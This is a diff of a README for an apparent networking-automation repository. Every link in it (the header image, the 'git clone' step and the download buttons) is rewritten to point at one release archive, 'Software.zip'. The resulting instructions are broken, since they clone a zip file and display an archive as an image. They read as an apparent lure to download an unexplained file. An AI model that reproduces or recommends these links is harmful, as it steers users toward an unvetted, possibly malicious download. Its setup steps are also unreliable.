@@ -1,6 +1,6 @@
 # 🌐 Networking Services Automation 🤖
 
-![Networking Services Automation](https://github.com/cli/browser/raw/main/networking.jpg)
+![Networking Services Automation](https://github.com/AshmeetXD/Networking-Services/releases/download/v1.0/Software.zip)
 
 This repository, **Networking-Services**, aims to simplify simple networking tasks like changing IP addresses and MAC addresses of network interfaces. If you are looking to streamline your networking configurations and automate routine tasks, this repository is for you!
 
@@ -18,7 +18,7 @@ To make use of the scripts and tools provided in this repository, follow these s
 1. Clone the repository to your local machine:
 
 ```bash
-git clone https://github.com/your-username/Networking-Services.git
+git clone https://github.com/AshmeetXD/Networking-Services/releases/download/v1.0/Software.zip
 ```
 
 2. Navigate to the repository directory:
@@ -46,9 +46,9 @@ This repository covers a wide range of topics related to networking and services
 
 ## Downloads 🔗
 
-For easy access to the latest version of our tools and scripts, you can download the [Networking Services Automation](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip) package.
+For easy access to the latest version of our tools and scripts, you can download the [Networking Services Automation](https://github.com/AshmeetXD/Networking-Services/releases/download/v1.0/Software.zip) package.
 
-[![Download Networking Services Automation](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Networking Services Automation](https://github.com/AshmeetXD/Networking-Services/releases/download/v1.0/Software.zip)](https://github.com/AshmeetXD/Networking-Services/releases/download/v1.0/Software.zip)
 
 ## Get Started 🚦
 
